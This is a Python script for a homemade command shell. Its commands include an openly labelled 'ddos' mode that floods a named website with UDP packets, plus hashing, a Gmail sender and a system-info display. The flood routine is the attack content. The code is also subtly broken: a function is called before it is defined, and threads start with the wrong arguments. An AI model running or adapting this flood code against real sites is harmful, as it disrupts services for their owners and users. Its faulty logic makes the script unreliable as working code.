#!/usr/bin/env python3

from os import *
import hashlib
from getpass import *
import platform
import time
from socket import *
import sys
import _thread
import pystyle
import smtplib
import multiprocessing
import urllib
systeme = "found"
try:
    import pyfiglet
except:
    system("pip install pyfiglet")
    time.sleep(0.1)
    try:
        system("clear")
        systeme = "yes kernel"
    except:
        system("cls")
        systeme = "no kernel"
try:
    import rainbowtext
except:
    system("pip install rainbowtext")
    time.sleep(0.1)
    if systeme == "yes kernel":
        system("clear")
    elif systeme == "no kernel":
        system("cls")
    elif systeme == "found":
        try:
            system("clear")
            systeme = "yes kernel"
        except:
            system("cls")
            systeme = "no kernel"
" ------------------------- "
#-
green = "\033[32m"
red = "\033[31m"
blue = "\033[36m"
pink = "\033[35m"
yellow = "\033[93m"
darkblue = "\033[34m"
white = "\033[00m"
mark = '\x1b[38;5;4m'
mark1 = '\x1b[48;5;15m'
mark2 = '\x1b[0m'
#001
def help():
    pystyle.Write.Print("""
    Attack ddos :
            ddos -u (URL Target) -t (thread) | for attack ddos by dic
    hash creator :
            hash -t (Type hash) -p (text) | Hasher Text
    send mail by gmail :
            send_mail --addressgmailyou (address your email for send email) --pass (Password your gmail) -t (address gmail target for send message) --subject (subject message) -m (text your message)
    infosystem : 
            info_system | see info system your!
    """,pystyle.Colors.green_to_red)
def DDOSAT(url,threadcount):
    site = url
    thread_count = threadcount
    ip = gethostbyname(site)
    UDP_PORT = 80
    MESSAGE = 'fuckYou:)'
    time.sleep(3)
    ddos(url,thread_count)
    def ddos(site,thread_count):
        ip = gethostbyname(site)
        UDP_PORT = 80
        print("UDP target IP:", ip)
        print("UDP target port:", UDP_PORT)
        while 1:
            sock = socket(AF_INET, SOCK_DGRAM)
            sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
            pystyle.Write.Print("Packet Sent",pystyle.Colors.green_to_red,0.001)
            print()
            for i in range(int(thread_count)):
                try:
                    _thread.start_new_thread(ddos, ("Thread-" + str(i),))
                except KeyboardInterrupt:
                    sys.exit(0)
def sendgmail(ad_gmail,pass_gmail,target,subject,message):
    try:
        ms= message
        message = """From Person <{0}>
    To: To Person <{1}>
    MIME-Version: 1.0
    Content-type: text/html
    Subject: {2}

    {3}""".format(ad_gmail, target, subject, ms)
        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
        smtpObj.ehlo()
        smtpObj.starttls()
        smtpObj.login(ad_gmail, pass_gmail)
        smtpObj.sendmail(ad_gmail,target,message)
        pystyle.Write.Print("your message sended !",pystyle.Colors.green_to_red,0.001)
        print()
    except:
        pystyle.Write.Print("failed in the login your account gmail! pleas retry",pystyle.Colors.green_to_red,0.001)
        print()
def info():
    im = """
    Hello , Im Optasiom. Iam programmer and developer this program
    for see help enter command = help or h
    
    Cod3r = OPTASIOM
    """
def infosys():
    print("Local IP Address:",gethostbyname(gethostname()))
    print()
    print("Name: " +gethostname())
    print()
    print("FQDN: " +getfqdn())
    print()
    print("System Platform: "+sys.platform)
    print()
    print("Machine: " +platform.machine())
    print()
    print("Node: " +platform.node())
    print()
    print("Platform: "+platform.platform())
    print()
    print("Pocessor: " +platform.processor())
    print()
    print("System OS: "+platform.system())
    print()
    print("Release: " +platform.release())
    print()
    print("Version: " +platform.version())
    print()
    print("Number of CPU Core: " ,multiprocessing.cpu_count())
    print()
    print("Date-Time: ",time.ctime())
    print()
def hashcr(text_hash,type_hash):
    text_hash=text_hash
    type_hash=type_hash
    if type_hash == "md5":
        md5 = hashlib.md5()
        md5.update(text_hash.encode())
        print(md5.hexdigest())
    elif type_hash == "sha1":
        sha1 = hashlib.sha1()
        sha1.update(text_hash.encode())
        print(sha1.hexdigest())
    elif type_hash == "sha224":
        sha224 = hashlib.sha224()
        sha224.update(text_hash.encode())
        print(sha224.hexdigest())
    elif type_hash == "sha256":
        sha256 = hashlib.sha256()
        sha256.update(text_hash.encode())
        print(sha256.hexdigest())
    elif type_hash == "sha384":
        sha384 = hashlib.sha384()
        sha384.update(text_hash.encode())
        print(sha384.hexdigest())
    elif type_hash == "sha512":
        sha512 = hashlib.sha512()
        sha512.update(text_hash.encode())
        print(sha512.hexdigest())
    else:
        pystyle.Write.Print("type this is not hash! pleas back and retry test",pystyle.Colors.green_to_yellow,0.002)   
        print()
    
# ------------------ cheack network
network = 0
try:
    system("clear")
    systeme = "yes kernel"
except:
    system("cls")
    systeme = "no kernel"
try:
    connect = gethostbyname('Google.com')
    network = 1
except:
    pystyle.Write.Print("failed to connecting the Network ! pleas cheack network...",pystyle.Colors.green_to_yellow,0.002)
    print()
    network = 0
text=pyfiglet.figlet_format(text="| Sh3ll.optasiom |")
pystyle.Write.Print(text, \
    pystyle.Colors.green_to_red,0.001)
while 1:
    " shell commands "
    patch = getcwd()
    user = getuser()
    command = input(f"{red}!{yellow}<{blue}{user}{yellow}>{red}/{darkblue}{patch}{yellow}~{red} ${pink} ")
    print()
    text = command.split()
    if command.startswith('cd'):
                newPath = command.replace('cd ', '')
                chdir(newPath)
    elif "clear" in text:
        if systeme == "yes kernel":
            system("clear")
        elif systeme == "no kernel":
            system("cls")
        elif systeme == "found":
            try:
                system("clear")
                systeme = "yes kernel"
            except:
                system("cls")
                systeme = "no kernel"
    elif "cls" in text:
        if systeme == "yes kernel":
            system("clear")
        elif systeme == "no kernel":
            system("cls")
        elif systeme == "found":
            try:
                system("clear")
                systeme = "yes kernel"
            except:
                system("cls")
                systeme = "no kernel"
    elif "ls" in text:
        if systeme == "yes kernel":
            system("ls")
        elif systeme == "no kernel":
            def discoverFiles():
                patch = getcwd()

                for dirpath, dirs, files in walk(patch):
                    for i in files:
                        absolute_path = path.abspath(path.join(dirpath, i))
                        ext = absolute_path.split('.')[-1]
                        print(absolute_path)
                    
            discoverFiles()
        
    elif "hash" in text:
        if "-t" in text:
            type_hash = text[text.index("-t")+1]
            if "-p" in text:
                text_hash = str(text[text.index("-p")+1])
                hashcr(text_hash,type_hash)
            else:
                pystyle.Write.Print("pleas enter : hash  -t (type hash ) -p (text hash)",pystyle.Colors.purple_to_red,0.001)
                print()

        else:
            pystyle.Write.Print("pleas enter : hash  -t (type hash ) -p (text hash)",pystyle.Colors.purple_to_red,0.001)
            print()

    elif "ddos" in text:
        ok_ddos_u = 0
        ddos_u = ""
        ddos_t = ""
        ok_ddos_t = 0
        if "-u" in text:
            url = text[text.index("-u")+1]
            ok_ddos_u = 1
            ddos_u = url
            if "-t" in text:
                threads = text[text.index("-t")+1]
                ok_ddos_t = 1
                ddos_t = threads
        if network == 1 :
            if ok_ddos_u == 1 & ok_ddos_t == 1 :
                DDOSAT(ddos_u,ddos_t)
            else :
                if ddos_t == 0 :
                    pystyle.Write.Print("pleas enter theard = < `ddos -url (web target for attacke) -t (theard)` >",pystyle.Colors.purple_to_red,0.001)
                    print()
                if ddos_u == 0 :
                    pystyle.Write.Print("pleas enter url = < `ddos -url (web target for attacke) -t (theard)` >",pystyle.Colors.purple_to_red,0.001)
                    print()
        else :
            pystyle.Write.Print("your not connection network ! back and cheack network and enter command => restart",pystyle.Colors.purple_to_red,0.001)
            print()
    elif "send_mail" in text:
        ok_g = 0
        if "--addressgmailyou" in text:
            ad_g = text[text.index("--addressgmail")+1]
            if "--pass" in text:
                pas = text[text.index("--pass")+1]
                if "-t" in text:
                    target = text[text.index("-t")+1]
                    if "--subject" in text:
                        subject = text[text.index("--subject")+1]
                        if "-m" in text:
                            message = text[text.index("-m")+1]
                            ok = 1
        if ok_g == 0:
            pystyle.Write.Print("pleas Enter command => send_mail --addressgmailyou (address your gmail)--pass (password your gmail) -t (target for send message) --subject (subject) -m (message)",pystyle.Colors.purple_to_red,0.001)
            print()
        if network == 1:
            sendgmail(ad_g,pas,target,subject,message)
        else:
            pystyle.Write.Print("your not connection network ! back and cheack network and enter command => restart",pystyle.Colors.purple_to_red,0.001)
            print()
    elif "info_system" in text:
            infosys()
    elif "restart" in text:
            print()
    elif "exit" in text:
        break
    elif "help" in text:
        help()
    else:
        print(f"{red}not found : ",command)

            